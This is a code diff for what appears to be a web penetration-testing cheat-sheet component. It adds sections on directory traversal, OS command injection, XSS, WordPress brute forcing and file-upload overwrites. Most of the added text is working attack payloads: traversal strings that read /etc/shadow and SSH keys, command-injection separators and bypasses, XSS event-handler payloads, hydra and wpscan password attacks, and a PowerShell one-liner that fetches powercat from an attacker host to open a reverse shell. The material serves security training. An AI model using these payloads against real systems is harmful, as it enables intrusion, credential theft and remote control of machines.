@@ -20,8 +20,10 @@ export class Web implements OnInit {
     { id: 'recon', label: 'Recon' },
     { id: 'technology', label: 'Technology' },
     { id: 'directories', label: 'Directories' },
+    { id: 'wordpress', label: 'WordPress' },
     { id: 'authentication', label: 'Authentication' },
     { id: 'sqli', label: 'SQL Injection' },
+    { id: 'os-command', label: 'OS Command Injection' },
     { id: 'xss', label: 'XSS' },
     { id: 'file-upload', label: 'File Upload' },
     { id: 'lfi', label: 'LFI / RFI' },
@@ -893,134 +895,72 @@ php://filter/convert.base64-encode/resource=index.php
 `;
 
 directoryTraversal = `
-# ==========================================
-# BASIC DIRECTORY TRAVERSAL
-# ==========================================
-
-# Linux - /etc/passwd
+# Basic directory traversal
 http://<IP>/index.php?page=../../../../etc/passwd
-
-# Windows - hosts
 http://<IP>/index.php?page=../../../../../../Windows/System32/drivers/etc/hosts
-
-# SSH private key
 http://<IP>/index.php?page=../../../../home/<user>/.ssh/id_rsa
+`;
 
+directoryTraversalParameters = `
+# Potentially vulnerable parameters
+page=, file=, path=, doc=, folder=, include=, lang=, template=
 
-# ==========================================
-# PARAMETER ENUMERATION
-# ==========================================
-
-# Common vulnerable parameters
-page=
-file=
-path=
-doc=
-folder=
-include=
-lang=
-template=
-
-# Example
+# Establish the expected value and test traversal
 http://<IP>/index.php?page=about.html
-
-# Test traversal
 http://<IP>/index.php?page=../../../../etc/passwd
+`;
 
-
-# ==========================================
-# TRAVERSAL PAYLOADS
-# ==========================================
-
-# Basic
+directoryTraversalPayloads = `
+# Basic / deep traversal
 ../../../../etc/passwd
-
-# Deep traversal
 ../../../../../../../../etc/passwd
 
 # Windows
-..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts
+..\..\..\..\Windows\System32\drivers\etc\hosts
 
-# Null byte - legacy systems
+# Legacy null byte
 ../../../../etc/passwd%00
 
-
-# ==========================================
-# FILTER BYPASS
-# ==========================================
-
-# URL encoding
+# URL encoding and double encoding
 %2e%2e%2f%2e%2e%2fetc/passwd
-
-# Double encoding
 %252e%252e%252f
 
-# Backslashes - Windows
-..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts
-
-# Mixed encoding
-%2e%2e/\\%2e%2e/\\etc/passwd
-
-# Dot obfuscation
+# Mixed encoding and obfuscation
+%2e%2e/\%2e%2e/\etc/passwd
 ....//....//....//etc/passwd
-
-# Alternative dot obfuscation
-....\\/....\\/....\\/etc/passwd
-
-# Mixed traversal
+....\/....\/....\/etc/passwd
 ..../..../..../..../etc/passwd
-
-# Mixed traversal with current directory
 ../.././../.././etc/passwd
-
-# Redundant slashes
 ../../../../etc//passwd
-
-# Current directory
 ../../../../etc/./passwd
+`;
 
-
-# ==========================================
-# USEFUL LINUX FILES
-# ==========================================
-
+directoryTraversalFiles = `
+# Linux
 /etc/passwd
 /etc/shadow
 /home/<user>/.ssh/id_rsa
 /var/log/auth.log
 /var/www/html/config.php
 
-
-# ==========================================
-# USEFUL WINDOWS FILES
-# ==========================================
-
+# Windows
 C:\\Windows\\System32\\drivers\\etc\\hosts
 C:\\inetpub\\wwwroot\\web.config
 C:\\inetpub\\logs\\LogFiles\\W3SVC1\\
+`;
 
-
-# ==========================================
-# QUICK TESTING
-# ==========================================
-
+directoryTraversalTools = `
 # curl
 curl "http://<IP>/index.php?page=../../../../etc/passwd"
 
-# Burp Suite
-# Intercept request -> modify parameter -> send payload
-
-
-# ==========================================
-# NOTES
-# ==========================================
-
-# Try different traversal depths.
-# Test both encoded and unencoded payloads.
-# Check for ../ filtering.
-# Test both / and \\ on Windows targets.
-# Combine with LFI / file inclusion when applicable.
+# Burp Suite: intercept, modify the parameter, and send the payload.
 `;
+
+directoryTraversalNotes = `
+# Try different traversal depths, encoded and unencoded values, and both slash styles on Windows.
+# Check for ../ filtering and normalization; combine with LFI or file inclusion where applicable.
+`;
+
   webDirectories = `
 ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
 
@@ -1097,6 +1037,76 @@ sqlmap -u "http://<IP>/page.php?id=1" \\
 --dbs --batch
   `;
 
+  osCommandConcept = `
+OS command injection occurs when unsanitized input is incorporated into system commands.
+A command such as git clone concatenated with user input may allow additional commands.
+  `;
+
+  osCommandDetection = `
+id
+whoami
+hostname
+
+# POST example
+curl -X POST --data 'param=id' http://<IP>/endpoint
+  `;
+
+  osCommandEnumeration = `
+# Identify operating system
+git version
+ver
+
+# Distinguish CMD from PowerShell
+(dir 2>&1 *\`|echo CMD);<# rem #>echo PowerShell
+
+# Environment checks
+ipconfig
+ifconfig
+uname -a
+  `;
+
+  osCommandSeparators = `
+; ls
+&& whoami
+| id
+& dir
+
+# URL-encoded separators
+%3B -> ;
+%26%26 -> &&
+%7C -> |
+git;ipconfig
+  `;
+
+  osCommandBypass = `
+git%3Bipconfig
+cat\${IFS}/etc/passwd
+echo "test"
+echo test
+$(whoami)
+\`id\`
+  `;
+
+  osCommandExploitation = `
+Archive=git;whoami
+Archive=git;hostname
+Archive=git;ipconfig
+Archive=git;ifconfig
+Archive=git;dir
+Archive=git;ls -la
+  `;
+
+  osCommandReverseShell = `
+IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER>/powercat.ps1");powercat -c <ATTACKER_IP> -p 4444 -e powershell
+nc -nvlp 4444
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "..."
+  `;
+
+  osCommandNotes = `
+# Filters may block separators or command words. Execution context (CMD, PowerShell, Bash) matters.
+# Reverse shells require outbound connectivity; test only with authorization.
+  `;
+
   commandInjection = `
 # Identify parameters that may execute system commands.
 
@@ -1119,6 +1129,48 @@ $(id)
 
 "><img src=x onerror=alert(1)>
   `;
+
+  readonly xssPayloadVariants = [
+    {
+      title: 'HTML tags and quoted attributes',
+      command: `<!-- Try only when the input is rendered as HTML -->
+<script>alert('XSS')</script>
+"><script>alert(1)</script>
+\"><img src=x onerror=alert(1)>`
+    },
+    {
+      title: 'Image events',
+      command: `<!-- Hover proof -->
+<img src=x onmouseover="alert('XSS')">
+
+<!-- Broken-image proof -->
+<img src=x onerror=alert(1)>`
+    },
+    {
+      title: 'SVG events',
+      command: `<svg onload=alert(1)></svg>
+<svg/onload=alert('XSS')>`
+    },
+    {
+      title: 'HTML5 events',
+      command: `<details open ontoggle=alert(1)>test</details>
+<video src=x onerror=alert(1)></video>
+<input autofocus onfocus=alert(1)>`
+    },
+    {
+      title: 'Encoded output',
+      command: `<!-- Check whether entity-encoded event attributes are decoded before rendering -->
+<IMG SRC=x ONERROR=&#97;&#108;&#101;&#114;&#116;(1)>`
+    },
+    {
+      title: 'DOM and JavaScript context',
+      command: `<!-- For a value inserted into an HTML fragment -->
+#\"><img src=x onerror=alert(1)>
+
+<!-- For a JavaScript string context; adapt the quote/terminator to the sink -->
+';alert(1)//`
+    }
+  ];
 
   storedXss = `
 # Identify persistent input fields:
@@ -1150,6 +1202,103 @@ location
   // FILE UPLOAD
   // =========================================================
 
+  wordpressFingerprint = `
+/wp-login.php
+/wp-admin
+/wp-content/
+/wp-includes/
+
+generator: WordPress
+  `;
+
+  wordpressWpscan = `
+wpscan --url http://<IP>
+wpscan --url http://<IP> -e vp,u
+wpscan --url http://<IP> -e vp,u --api-token="<API_KEY>"
+wpscan --url http://<IP> -e t
+wpscan --url http://<IP> -e ap,at,tt,cb,dbe,u
+  `;
+
+  wordpressManual = `
+curl -s -X GET "http://<IP>/" | grep plugins
+curl -s -X GET "http://<IP>/" | grep -oP 'plugins/\K[^/]+' | sort -u
+  `;
+
+  wordpressXmlrpc = `
+/xmlrpc.php
+curl -s -X POST "http://<IP>/xmlrpc.php" -d@file.xml
+
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value><USERNAME></value></param>
+<param><value><PASSWORD></value></param>
+</params>
+</methodCall>
+  `;
+
+  wordpressAuthentication = `
+/wp-login.php
+/wp-admin
+wpscan --url http://<IP> -U <USERNAME> -P <WORDLIST>
+hydra -l <USERNAME> -P <WORDLIST> <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
+  `;
+
+  wordpressPostEnumeration = `
+# Review plugins/themes for vulnerabilities and check for exposed wp-config.php or backups.
+# Assess authorized admin capabilities for plugin upload or theme editing.
+/wp-content/plugins/
+/wp-content/themes/
+  `;
+
+  wordpressWorkflow = `
+1. Identify WordPress and fingerprint its components.
+2. Enumerate users, plugins, and themes.
+3. Research findings and check XML-RPC exposure.
+4. Validate authentication only within the authorized scope.
+5. Assess administrator capabilities and configuration exposure.
+  `;
+
+  uploadConcept = `
+File upload vulnerabilities arise when applications accept files without sufficient validation.
+Uploads may expose directory traversal, file overwrite, information disclosure, or privilege escalation.
+  `;
+
+  uploadDetection = `
+# Upload a harmless file (for example, test.txt) and check whether it is stored and accessible.
+# Upload the same file twice; observe errors or overwrite behavior.
+# In Burp Suite, inspect the filename parameter and the response for validation clues.
+  `;
+
+  uploadFilename = `
+# Filename manipulation
+filename=../../../../../../../test.txt
+
+# Check whether path components are accepted or normalized server-side.
+  `;
+
+  uploadTraversal = `
+# Example overwrite target
+../../../../../../../root/.ssh/authorized_keys
+
+# Verify impact carefully; unintended overwrites can disrupt the target.
+  `;
+
+  uploadPrivilege = `
+# Potential targets, only where writable and in scope
+/root/.ssh/authorized_keys
+/home/user/.ssh/authorized_keys
+Application configuration files
+Web server files
+
+# Web services commonly run as www-data or an IIS service identity; verify permissions.
+  `;
+
+  uploadNotes = `
+# Behavior depends on server-side validation and web-server permissions.
+# Blind overwrites may cause downtime. Test only with explicit authorization.
+  `;
+
   fileUpload = `
 # Test:
 
@@ -1173,18 +1322,32 @@ file.php%00.jpg
   // =========================================================
 
   lfi = `
-# Common parameters:
+# Common parameters: page=, file=, path=, doc=, include=, lang=, template=
 
-?page=
-?file=
-?path=
-?include=
-?template=
-?document=
-
-Example:
-
+# Linux and Windows test files
 http://<IP>/index.php?page=../../../../etc/passwd
+http://<IP>/index.php?page=../../../../boot.ini
+http://<IP>/index.php?page=../../../../../../../../Windows/System32/drivers/etc/hosts
+
+# Typical vulnerable PHP pattern
+include($_GET['page']);
+
+# Useful files
+/etc/passwd
+/etc/shadow
+/home/<user>/.ssh/id_rsa
+/var/www/html/config.php
+/var/log/apache2/access.log
+C:\\Windows\\System32\\drivers\\etc\\hosts
+C:\\inetpub\\wwwroot\\web.config
+  `;
+
+  lfiDetection = `
+# Confirm LFI by checking whether a known local file is returned.
+?page=../../../../../../../../etc/passwd
+?page=../../../../../../../../boot.ini
+
+# Common goals: read source/configuration, recover credentials, or assess wrappers and log poisoning.
   `;
 
   // =========================================================
